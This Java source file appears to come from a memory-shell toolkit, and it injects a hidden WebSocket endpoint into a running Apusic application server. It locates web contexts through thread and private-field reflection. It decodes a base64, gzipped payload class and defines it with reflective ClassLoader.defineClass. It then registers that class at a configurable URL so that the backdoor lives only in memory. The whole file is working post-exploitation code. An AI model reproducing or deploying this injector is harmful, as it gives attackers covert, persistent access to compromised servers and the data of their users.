package com.reajason.javaweb.memshell.injector.apusic;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;
import java.util.zip.GZIPInputStream;

/**
 * Apusic JSR-356 WebSocket 注入器：Apusic 9 的 {@code lib/ext/tyrus-server-1.7.jar} 带有
 * {@code org.glassfish.tyrus.servlet.TyrusServletContainerInitializer}，部署时把
 * {@code ServerContainer} 写入 ServletContext（{@code com.apusic.web.container.WebContainer}
 * 本身实现 ServletContext），注入器取出后注册 Endpoint。
 * <p>
 * Tyrus 1.x 在部署结束后会关闭 addEndpoint，但 {@code TyrusServerContainer.register} 仍直接把
 * 端点写入 WebSocketEngine。Apusic 9.0.1 没有 Tyrus，注入器会跳过。
 *
 * @author ReaJason
 */
public class ApusicWebSocketInjector {

    private static String msg = "";
    private static boolean ok = false;

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() {
        return "{{base64Str}}";
    }

    public ApusicWebSocketInjector() {
        if (ok) {
            return;
        }
        Set<Object> contexts = null;
        try {
            contexts = getContext();
        } catch (Throwable throwable) {
            msg += "context error: " + getErrorMessage(throwable);
        }
        if (contexts == null || contexts.isEmpty()) {
            msg += "context not found";
        } else {
            for (Object context : contexts) {
                try {
                    msg += ("context: [" + getContextRoot(context) + "] ");
                    Object shell = getShell(context);
                    if (inject(context, shell)) {
                        msg += "[" + getUrlPattern() + "] ready\n";
                    } else {
                        msg += "skip, no ServerContainer\n";
                    }
                } catch (Throwable e) {
                    msg += "failed " + getErrorMessage(e) + "\n";
                }
            }
        }
        ok = true;
        System.out.println(msg);
    }

    @SuppressWarnings("all")
    private String getContextRoot(Object context) {
        String r = null;
        try {
            r = (String) invokeMethod(context, "getContextPath", null, null);
        } catch (Exception ignored) {
        }
        String c = context.getClass().getName();
        if (r == null) {
            return c;
        }
        if (r.isEmpty()) {
            return c + "(/)";
        }
        return c + "(" + r + ")";
    }

    /**
     * context - webapp: com.apusic.deploy.runtime.WebModule
     * /usr/local/ass/lib/apusic.jar
     */
    public Set<Object> getContext() throws Exception {
        Set<Object> contexts = new HashSet<Object>();
        Set<Thread> threads = Thread.getAllStackTraces().keySet();
        for (Thread thread : threads) {
            if (thread.getName().contains("HouseKeeper")) {
                // Apusic 9.0 SPX
                Object sessionManager = getFieldValue(thread, "this$0");
                contexts.add(getFieldValue(sessionManager, "container"));
            } else if (thread.getName().contains("HTTPSession")) {
                // Apusic 9.0.1
                Object sessionManager = getFieldValue(thread, "this$0");
                Map<?, ?> contextMap = ((Map<?, ?>) getFieldValue(getFieldValue(sessionManager, "vhost"), "contexts"));
                contexts.addAll(contextMap.values());
            }
        }
        return contexts;
    }

    private Object getShell(Object context) throws Exception {
        // WebApp 类加载器，ServletContext 使用这个进行组件的类加载
        ClassLoader loader = (ClassLoader) getFieldValue(context, "loader");
        ClassLoader defineLoader;
        Object obj;
        try {
            // Apusic 9.0 SPX，优先从当前 loader 进行加载
            defineShell(loader);
            obj = loader.loadClass(getClassName()).newInstance();
            defineLoader = loader;
        } catch (ClassNotFoundException e) {
            // Apusic 9.0.1，委托给 jspLoader 进行加载，因此直接往 loader 里面 define 会 ClassNotFound
            ClassLoader internalLoader = (ClassLoader) getFieldValue(getFieldValue(loader, "delegate"), "jspLoader");
            defineShell(internalLoader);
            obj = loader.loadClass(getClassName()).newInstance();
            defineLoader = internalLoader;
        }
        msg += "[" + defineLoader.getClass().getName() + "] ";
        return obj;
    }

    @SuppressWarnings("all")
    private void defineShell(ClassLoader classLoader) throws Exception {
        try {
            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
        } catch (Throwable ignored) {
        }
    }

    private boolean inject(Object context, Object shell) throws Exception {
        Object container = getServerContainer(context);
        if (container == null) {
            return false;
        }

        if (findEndpoint(container)) {
            return true;
        }

        ClassLoader classLoader = shell.getClass().getClassLoader();
        Class<?> serverEndpointConfigClass;
        Class<?> builderClass;
        try {
            serverEndpointConfigClass = classLoader.loadClass("javax.websocket.server.ServerEndpointConfig");
            builderClass = classLoader.loadClass("javax.websocket.server.ServerEndpointConfig$Builder");
        } catch (ClassNotFoundException e) {
            serverEndpointConfigClass = classLoader.loadClass("jakarta.websocket.server.ServerEndpointConfig");
            builderClass = classLoader.loadClass("jakarta.websocket.server.ServerEndpointConfig$Builder");
        }

        Constructor<?> constructor = builderClass.getDeclaredConstructor(Class.class, String.class);
        constructor.setAccessible(true);
        Object builder = constructor.newInstance(shell.getClass(), getUrlPattern());
        Object endpointConfig = invokeMethod(builder, "build", null, null);

        // Apusic 9 的 tyrus-server-1.7.jar 不含 tyrus-client，TyrusServerContainer 的方法签名
        // 引用了 org.glassfish.tyrus.client.ClientManager，直接反射这个类会 NoClassDefFoundError；
        // 缓冲区大小改从 WebSocketContainer 接口调用。
        Class<?> webSocketContainerClass = classLoader.loadClass(serverEndpointConfigClass.getName().startsWith("javax.")
                ? "javax.websocket.WebSocketContainer" : "jakarta.websocket.WebSocketContainer");
        Method setTextBufferSize = webSocketContainerClass.getMethod("setDefaultMaxTextMessageBufferSize", int.class);
        setTextBufferSize.invoke(container, 52428800);
        Method setBinaryBufferSize = webSocketContainerClass.getMethod("setDefaultMaxBinaryMessageBufferSize", int.class);
        setBinaryBufferSize.invoke(container, 52428800);

        Method register = getDeclaredMethod(container.getClass(), "register", new Class[]{serverEndpointConfigClass});
        if (register != null) {
            register.setAccessible(true);
            register.invoke(container, endpointConfig);
        } else {
            Method addEndpoint = webSocketContainerClass.getMethod("addEndpoint", serverEndpointConfigClass);
            addEndpoint.invoke(container, endpointConfig);
        }
        return true;
    }

    /**
     * 只在目标类自身的 declared methods 中查找。父类 TyrusServerContainer 的方法表带有
     * 缺失的 ClientManager 签名，解析它会抛 NoClassDefFoundError。
     */
    private Method getDeclaredMethod(Class<?> clazz, String name, Class<?>[] paramTypes) {
        try {
            return clazz.getDeclaredMethod(name, paramTypes);
        } catch (Throwable ignored) {
            return null;
        }
    }

    /**
     * Apusic 9 的 context 就是 ServletContext；9.0.1 取到 WebModule 时再取 webapp。
     */
    private Object getServerContainer(Object context) throws Exception {
        Object servletContext = context;
        Object container;
        try {
            container = getServerContainerAttribute(servletContext);
        } catch (NoSuchMethodException e) {
            Object webapp = getFieldValue(context, "webapp");
            if (webapp == null) {
                return null;
            }
            try {
                servletContext = invokeMethod(webapp, "getServletContext", null, null);
            } catch (Exception ex) {
                servletContext = webapp;
            }
            container = getServerContainerAttribute(servletContext);
        }
        return container;
    }

    private Object getServerContainerAttribute(Object servletContext) throws Exception {
        Object container = invokeMethod(servletContext, "getAttribute", new Class[]{String.class}, new Object[]{"javax.websocket.server.ServerContainer"});
        if (container == null) {
            container = invokeMethod(servletContext, "getAttribute", new Class[]{String.class}, new Object[]{"jakarta.websocket.server.ServerContainer"});
        }
        return container;
    }

    /**
     * 引擎持有全部已注册 Endpoint，按配置路径判断是否已注入。
     */
    @SuppressWarnings("unchecked")
    private boolean findEndpoint(Object container) {
        try {
            Object engine = invokeMethod(container, "getWebSocketEngine", null, null);
            Object wrappers = getFieldValue(engine, "endpointWrappers");
            if (!(wrappers instanceof Iterable)) {
                return false;
            }
            for (Object wrapper : (Iterable<Object>) wrappers) {
                try {
                    Object config = invokeMethod(wrapper, "getEndpointConfig", null, null);
                    Object path = invokeMethod(config, "getPath", null, null);
                    if (getUrlPattern().equals(path)) {
                        return true;
                    }
                } catch (Throwable ignored) {
                }
            }
        } catch (Throwable ignored) {
        }
        return false;
    }

    @Override
    public String toString() {
        return msg;
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Method method = null;
        while (clazz != null && method == null) {
            try {
                if (paramClazz == null) {
                    method = clazz.getDeclaredMethod(methodName);
                } else {
                    method = clazz.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException("Method not found: " + methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj instanceof Class ? null : obj, param);
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        if (obj == null) {
            return null;
        }
        for (Class<?> clazz = obj.getClass(); clazz != Object.class; clazz = clazz.getSuperclass()) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException ignored) {
            }
        }
        return null;
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}
